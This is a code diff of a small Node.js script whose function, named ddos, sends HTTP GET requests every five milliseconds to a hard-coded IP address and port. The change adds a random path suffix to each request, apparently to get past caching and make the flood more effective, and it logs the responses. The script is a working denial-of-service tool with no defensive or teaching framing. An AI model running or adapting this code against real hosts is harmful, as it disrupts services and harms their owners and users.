@@ -13,7 +13,9 @@ res.end()
 setInterval(ddos,5)
 
 function ddos(){
-    http.get('http://13.233.2.27:5000', {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
+    const extra=Math.random()
+    const uril='http://13.233.2.27:5000/a'+extra
+    http.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
         let pythonData = '';
       
         // A chunk of data has been recieved.
@@ -23,6 +25,7 @@ function ddos(){
       
         // The whole response has been received. Print out the result.
         resp.on('end', () => {
+            console.log(pythonData)
         });
       
       }).on("error", (err) => {
